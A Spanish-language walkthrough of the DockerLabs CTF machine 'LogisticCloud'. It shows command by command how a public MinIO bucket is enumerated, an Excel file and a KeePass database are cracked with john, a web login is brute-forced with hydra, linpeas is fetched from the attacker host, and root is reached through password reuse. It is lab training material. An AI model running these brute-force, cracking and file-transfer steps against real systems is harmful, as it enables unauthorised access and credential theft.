Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Medium
- Tags: #keepass #login-bruteforce #minio #john #password-cracking #xlsx


## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad

- ttl 64 indica maquina linux.

```bash
┌──(wndr㉿wndr)-[~]
└─$ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=2.65 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 2.650/2.650/2.650/0.000 ms
```

Ahora puedo triar un escaneo con nmap para ver que puertos tenemos abiertos.

```bash\
┌──(wndr㉿wndr)-[~]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 172.17.0.2

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
80/tcp   open  http       syn-ack ttl 64
9000/tcp open  cslistener syn-ack ttl 64
9001/tcp open  tor-orport syn-ack ttl 64
```

- Puertos 22, 80, 9000 y 9001 abiertos.


Sobre los puertos abiertos realizo un segundo escaneo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/logisticcloud]
└─$ sudo nmap -p 22,80,9000,9001 -sV -sC -Pn -n -vvv 172.17.0.2 -oN nmap/target

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 e9:59:86:db:ea:af:ff:09:ee:8f:ab:c6:0d:b8:b5:82 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAPvuGXjKVWhkRzI+FqZllEl6EcX3WSl0Av6UK2F9J7HOqkwgQcwhx+kgwTj0RjqX/LbDYobq4pHpOTkiuo6u60=
|   256 ff:8d:9f:f8:e7:a5:f4:ce:6a:2d:e4:30:ac:77:18:fc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKEzpVEEE1pSxdy11KOuLV+kd1Yt5SFNAStIsiVdA5xY
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Login - HLG Logistics
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
9000/tcp open  http    syn-ack ttl 64 Golang net/http server
| http-methods:
|_  Supported Methods: GET OPTIONS
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 303
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 188A00A7C7616ACF
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 12 Jan 2026 14:02:04 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/nice ports,/Trinity.txt.bak</Resource><RequestId>188A00A7C7616ACF</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   GenericLines, Help, RTSPRequest, SSLSessionReq:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 276
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 188A00A446DF6FBE
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 12 Jan 2026 14:01:49 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>188A00A446DF6FBE</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Mon, 12 Jan 2026 14:01:49 GMT
|_    Content-Length: 0
|_http-server-header: MinIO
|_http-title: Did not follow redirect to http://172.17.0.2:9001
9001/tcp open  http    syn-ack ttl 64 Golang net/http server
|_http-server-header: MinIO Console
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| fingerprint-strings:
|   GenericLines, SSLSessionReq:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions:
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Content-Length: 1309
|     Content-Security-Policy: default-src 'self' 'unsafe-eval' 'unsafe-inline'; script-src 'self' https://unpkg.com; connect-src 'self' https://unpkg.com;
|     Content-Type: text/html
|     Last-Modified: Mon, 12 Jan 2026 14:01:49 GMT
|     Referrer-Policy: strict-origin-when-cross-origin
|     Server: MinIO Console
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 12 Jan 2026 14:01:49 GMT
|_    <!doctype html><html lang="en"><head><meta charset="utf-8"/><base href="/"/><meta content="width=device-width,initial-scale=1" name="viewport"/><meta content="#081C42" media="(prefers-color-scheme: light)" name="theme-color"/><meta content="#081C42" media="(prefers-color-scheme: dark)" name="theme-color"/><meta content="MinIO Console" name="description"/><meta name="minio-license" content="agpl"/><link href="./s
|_http-favicon: Unknown favicon MD5: 0CBEF993258D858D57446224DBA4968F
|_http-title: MinIO Console
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :

MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Tenemos la siguiente informacion:

- Puerto 80 HTTP
- Puerto 22 SSH
- Puerto 9000: API de Minio
- Puerto 9001: Web UI de Minio.
## Enumeración

### Puerto 80 HTTP

Al entrar por el puerto 80 podemos ver un panel login.

![](assets/Pasted%20image%2020260112080647.png)

En su codigo fuente tiene lo siguiente:

- `bucket` llamado `huguelogistics-data`

```bash
<div class="container">
    <h2>HLG Logistics - Ingreso</h2>
        <form method="post" action="index.php">
        <label>Usuario:</label>
	<input hidden="huguelogistics-data" name="bucket">
        <input type="text" name="username" required>
        <label>Contraseña:</label>
        <input type="password" name="password" required>
        <input type="submit" value="Entrar al sistema">
    </form>
```

#### Tecnologias Web.

Por los headers puedo ver que corre un Apache/2.4.58 con OS `Ubuntu`.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/logisticcloud/nmap]
└─$ curl http://172.17.0.2/ -I

HTTP/1.1 200 OK
Date: Mon, 12 Jan 2026 14:05:20 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: PHPSESSID=3r7tt7l07srbsciem6grodmnfa; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
```

#### Fuzzing.

Con `ffuf` realice fuzzing para ver todos los recursos de la web.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/logisticcloud]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://172.17.0.2/FUZZ -e .git,.txt,.html,.php -ic

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev'
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .git .txt .html .php
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 1953, Words: 673, Lines: 78, Duration: 2ms]
.php                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 1ms]
.html                   [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 3ms]
index.php               [Status: 200, Size: 1953, Words: 673, Lines: 78, Duration: 3ms]
admin.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 0ms]
javascript              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 0ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
vendor                  [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 0ms]
```

- Destaca `note.txt`


**/note.txt**

Le tire un curl a este archivo para ver que contenía.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/logisticcloud]
└─$ curl http://172.17.0.2/note.txt

/backup.xlsx
```

- Una ruta /backup.xlsx. Trate de acceder desde la raíz de la web pero no existía nada.

### MINIO (9000, 9001)

#### 9001 Web Ui

!!! info
    **MinIO Object Storage** es un sistema de **almacenamiento de objetos** compatible con **Amazon S3**, diseñado para **guardar y servir archivos** (objetos) a través de una API HTTP o Web.
    Se usa comúnmente para **backups, archivos de aplicaciones, datos estáticos y almacenamiento en contenedores**, y suele desplegarse **on-premise o en Docker/Kubernetes**.

    Cada objeto se guarda dentro de un **bucket**, junto con metadatos, y el acceso se controla mediante **credenciales y políticas**, de forma similar a AWS S3.

Podemos ver que la interfaz Web para Minio corre por el 9001.

![](assets/Pasted%20image%2020260112081539.png)

#### API Minio Puerto 9000

La api de minio esta corriendo por el puerto 9000 y sigue la siguiente sintaxis:

```
http://IP:PUERTO/BUCKET/OBJETO
```

Podría enumerar las políticas del bucket con `aws-cli` pero primero voy a tirarle un simple curl para ver si el bucket es publico.

- huguelogistics-data es el nombre del bucket (sacado del codigo fuente).

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/logisticcloud]
└─$ curl http://172.17.0.2:9000/huguelogistics-data | xmllint  --format -

<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
  <Name>huguelogistics-data</Name>
  <Prefix/>
  <Marker/>
  <MaxKeys>1000</MaxKeys>
  <IsTruncated>false</IsTruncated>
  <Contents>
    <Key>backup.xlsx</Key>
    <LastModified>2025-05-08T13:54:45.395Z</LastModified>
    <ETag>"b6350379e5928b0b7a3d0ac321a03e0b"</ETag>
    <Size>15360</Size>
    <Owner>
      <ID>02d6176db174dc93cb1b899f7c6078f08654445fe8cf1b6ce98d8855f66bdbf4</ID>
      <DisplayName>minio</DisplayName>
    </Owner>
    <StorageClass>STANDARD</StorageClass>
  </Contents>
</ListBucketResult>
```

- Al parecer el bucket es publico y existe un objeto con nombre **backup.xlsx**.

Puedo descargarme este objeto:

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/logisticcloud]
└─$ curl http://172.17.0.2:9000/huguelogistics-data/backup.xlsx -o backup.xlsx

┌──(wndr㉿wndr)-[~/Machines/dockerlabs/logisticcloud]
└─$ ls
backup.xlsx 
```

Este archivo corresponde a una hoja de calculo  de Microsoft Excel.

- Al tratar de abrirlo con LibreOffice me pide contraseña.

![](assets/Pasted%20image%2020260112090015.png)

Lo puedo crackear con John.

- Primero tengo que extraer el hash

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/logisticcloud]
└─$ office2john backup.xlsx > backup.hash
```

- Ahora rompo el hash.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/logisticcloud]
└─$ john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2007 for all loaded hashes
Cost 2 (iteration count) is 50000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

password88       (backup.xlsx)

1g 0:00:00:03 DONE (2026-01-12 15:01) 0.2583g/s 4407p/s 4407c/s 4407C/s princez..mia305
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

- password88 es la contraseña del archivo.


Al abrir el archivo me encuentro con 50 registros de usuarios y credenciales.

![](assets/Pasted%20image%2020260112090439.png)

- Este archivo lo guarde como `csv` para poder manipularlo mas cómodamente.

Voy a generar 2 archivos de credenciales:

- Usando usuarios / contraseñas

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/logisticcloud]
└─$ awk -F',' 'NR>1 {print $6 ":" $7}' backup.csv > users.txt

┌──(wndr㉿wndr)-[~/Machines/dockerlabs/logisticcloud]
└─$ cat users.txt
juan.antonio.morell.aller:^6hcCUvV#J
ligia.molina.luna:_8Gq&BU+3h
humberto.madrid.bellido:9)6v_2HpbW
jimena.mora.aguilera:#4M#NiaqQU
...
```

Y usando correos / contraseñas 

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/logisticcloud]
└─$ awk -F',' 'NR>1 {print $3 ":" $7}' backup.csv > emails.txt

┌──(wndr㉿wndr)-[~/Machines/dockerlabs/logisticcloud]
└─$ cat emails.txt
wilfredo66@example.org:^6hcCUvV#J
candelasvendrell@example.net:_8Gq&BU+3h
carrenorosalva@example.com:9)6v_2HpbW
zacariascoca@example.net:#4M#NiaqQU
...
```

## Explotación

### Login BruteForce.

Con los archivos de credenciales anteriormente generados puedo tratar de brute forcea el panel de login de la web en el puerto **80**:

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/logisticcloud]
└─$ hydra -C users.txt 172.17.0.2 http-post-form "/index.php:bucket=hugelogistics-data&username=^USER^&password=^PASS^:Credenciales incorrectas" -I -f

Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-12 15:23:38
[DATA] max 16 tasks per 1 server, overall 16 tasks, 50 login tries, ~4 tries per task
[DATA] attacking http-post-form://172.17.0.2:80/index.php:bucket=hugelogistics-data&username=^USER^&password=^PASS^:Credenciales incorrectas

[80][http-post-form] host: 172.17.0.2   login: humberto.madrid.bellido   password: 9)6v_2HpbW

[STATUS] attack finished for 172.17.0.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-12 15:23:39
```

- Credenciales encontradas: humberto.madrid.bellido / 9)6v_2HpbW.

Puedo ingresar a la web por:

```bash
http://172.17.0.2
```

Al ingresar me topo con un panel de administración donde se me indica lo siguiente:

- Correo: wifredo66@example.org
- Rol: Operador
- Departamento: Almacén
- Teléfono xxx

![](assets/Pasted%20image%2020260112092522.png)

En la tab de **Usuarios** podemos ver informacion de todos los usuarios.

- Al parecer es casi idéntico al **/backup.xlsx** 

![](assets/Pasted%20image%2020260112092848.png)

Aparte de eso, no se observan muchos elementos relevantes. Sin embargo, destaca la existencia de distintos **roles de usuario**, como **Operador**, **Jefe de Área** y **Administrativo**, entre otros.
Asimismo, se identifican **departamentos** como **Logística**, **Inventario** y **Transporte**.
Esto sugiere que la aplicación web podría presentar un comportamiento **dinámico**, modificando su funcionalidad o contenido en función del **rol del usuario autenticado**.

La tab de **Informacion Logistica** nos indica que la web es un sistema de logística por lo cual voy a genera un archivo de credenciales filtrando por lo siguiente:

- Departamento: Logistica
- Rol:  Jefe de Área que parece ser el rol mas "alto".

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/logisticcloud/content]
└─$ sed -nE 's/^[^,]+,[^,]+,[^,]+,Logística,Jefe de Área,([^,]+),([^,]+),.*/\1:\2/p' backup.csv > credenciales.txt
```

Obtengo una única credencial:

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/logisticcloud/content]
└─$ cat credenciales.txt
prudencia.de.ferrera:)4UJM)JGab
```

Al ingresar a la web con las nuevas credenciales me topo con una nueva tab llamada **Bandeja de Entrada** que me muestra la siguiente informacion:

- Credenciales SSH
- Usuario: prudencia-de-ferrera
- Contraseña PuT3r3stA#SH

![](assets/Pasted%20image%2020260112093920.png)

Ahora debería de poder acceder por SSH:

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/logisticcloud/content]
└─$ ssh prudencia-de-ferrera@172.17.0.2

prudencia-de-ferrera@74866f96fae4:~$ id
uid=1001(prudencia-de-ferrera) gid=1001(prudencia-de-ferrera) groups=1001(prudencia-de-ferrera),100(users)
```

Tenemos la primera flag:

```bash
prudencia-de-ferrera@74866f96fae4:~$ ls
user.txt
prudencia-de-ferrera@74866f96fae4:~$ cat user.txt
a303ce44f50628e5511****
```

## Escalada de Privilegios

Enumere manualmente el sistema y encontré un proceso que se ejecuta como root.

- Este proceso corresponde a Minio (Puerto 9000 y  9001)

```bash
prudencia-de-ferrera@74866f96fae4:/var$ ps aux | grep root

root           1  0.0  0.0   2808  1948 ?        Ss   14:57   0:00 /bin/sh -c service apache2 start && service ssh start && MINIO_ROOT_USER=admin MINIO_ROOT_PASSWORD=Password123-*SuperSecretPassword2 minio server /data/s3 --console-address ":9001"
```

- Se muestras las credenciales para el usuario admin / `Password123-*SuperSecretPassword2`

Puedo ingresar a través de la web.

```bash
http://172.17.0.2:9001
```

![](assets/Pasted%20image%2020260112094822.png)

Pero al parecer es un rabbit-hole, no encontré manera de escalar a root mediante esto.

### Linpeas y Keepass.

Dentro del sistema enumere manualmente pero no encontré nada raro por lo cual opte por usar [linpeas.sh](https://github.com/peass-ng/PEASS-ng/releases/tag/20260101-f70f6a79) para realizar una enumeracion automática y mas exhaustiva.

- Yo ya tengo una copia local de [linpeas.sh](https://github.com/peass-ng/PEASS-ng/releases/tag/20260101-f70f6a79) por lo cual solo es cuestión de transferirla a la maquina victima y darle permisos.

```bash
prudencia-de-ferrera@74866f96fae4:/dev/shm$ wget 172.17.0.1/linpeas.sh
--2026-01-12 16:57:04--  http://172.17.0.1/linpeas.sh
Connecting to 172.17.0.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 971926 (949K) [application/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                           100%[======================================================================================================================>] 949.15K  --.-KB/s    in 0.008s

2026-01-12 16:57:04 (114 MB/s) - ‘linpeas.sh’ saved [971926/971926]

prudencia-de-ferrera@74866f96fae4:/dev/shm$ ls
linpeas.sh                                                                                                                                                     prudencia-de-ferrera@74866f96fae4:/dev/shm$ chmod +x linpeas.sh
```

Ahora voy a ejecutar linpeas para ver que obtengo:

- Una de las cosas que linpeas enumera es la existencia de archivos cuyo nombre contengan las palabras *password* o *credential*

```bash
prudencia-de-ferrera@74866f96fae4:/dev/shm$ bash linpeas.sh

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/credstore
/etc/credstore.encrypted
/etc/keepass/credentialsDatabase.kdb
/etc/pam.d/common-password
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder
```

- Se encuentra un archivo en /etc/keepass/credentialsDatabase.kdb

Este archivo llama la atención por que corresponde a un archivo de base de datos de contraseñas usado por keepas.

!!! info
    [KeePass](https://keepass.info/) es un gestor de contraseñas gratuito y de código abierto que almacena todas tus credenciales (usuarios, contraseñas, notas seguras) en una base de datos cifrada localmente, protegida por una única contraseña maestra o un archivo de clave, permitiéndote usar contraseñas únicas y fuertes para cada servicio sin tener que memorizarlas todas.

```bash
prudencia-de-ferrera@74866f96fae4:/etc/keepass$ ls
credentialsDatabase.kdb
```

Me voy a pasar este archivo a mi maquina:

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/logisticcloud]
└─$ scp prudencia-de-ferrera@172.17.0.2:/etc/keepass/credentialsDatabase.kdb .

prudencia-de-ferrera@172.17.0.2's password:
credentialsDatabase.kdb
```

Por defecto, los archivos de base de datos de keepas tienen una contraseña maestra.

- Para obtener esta contraseña maestra voy a extraer el hash de la base de datos.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/logisticcloud]
└─$ keepass2john credentialsDatabase.kdb > keepas.john

Inlining credentialsDatabase.kdb
```

- Y con john lo podemos romper ese hash:

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/logisticcloud/loot]
└─$ john keepas.john --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 600000 for all loaded hashes
Cost 2 (version) is 1 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:03:58 0.04% (ETA: 2026-01-20 10:25) 0g/s 26.03p/s 26.03c/s 26.03C/s bringiton..kissing
0g 0:00:04:01 0.04% (ETA: 2026-01-20 10:47) 0g/s 26.02p/s 26.02c/s 26.02C/s bugger..purple12
0g 0:00:04:20 0.04% (ETA: 2026-01-20 09:58) 0g/s 26.07p/s 26.07c/s 26.07C/s polly..guevara

EMINEM           (credentialsDatabase.kdb)

1g 0:00:05:03 DONE (2026-01-12 16:10) 0.003300g/s 26.19p/s 26.19c/s 26.19C/s Friends..melania
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- Se encontró la clave maestra: EMINEM

Para abrir este archivo voy a utilizar `kepassx`

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/logisticcloud/loot]
└─$ keepassxc & disown
[1] 173667
```

Le daremos a **Database -> Import -> KeePass 1 Database.** y colocaremos el archivo `.kdb` y la contraseña.

![](assets/Pasted%20image%2020260112101259.png)

Al momento de darle al boton de **Continue** se nos muestra una vista previa de la base de datos.

- Se puede notar que la contraseña de pablo no se ve completa.

![](assets/Pasted%20image%2020260112101343.png)

- Le daremos al boton de Done y seguiremos el proceso que nos indica `keepasx` para poder ver las credenciales completas.

Una vez importada la base de datos correctamente ya vamos a poder ver las 2 credenciales de los usuarios.

![](assets/Pasted%20image%2020260112101756.png)

Por si solas estas 2 credenciales no significan nada pero siempre es bueno reutilizarlas en algun otro servicio.

- En este caso utilice la password de pablo: **RMeEdDPKbgFWmPnQHVC8** para migrara root.

```bash
prudencia-de-ferrera@74866f96fae4:/etc/keepass$ su root
Password:
root@74866f96fae4:/etc/keepass# whoami
root
root@74866f96fae4:/etc/keepass# id
uid=0(root) gid=0(root) groups=0(root)
```

Somo root y podemos ver la flag

```bash
root@74866f96fae4:~# cat root.txt
16ceffb6b5f596855***
```

***PWNED***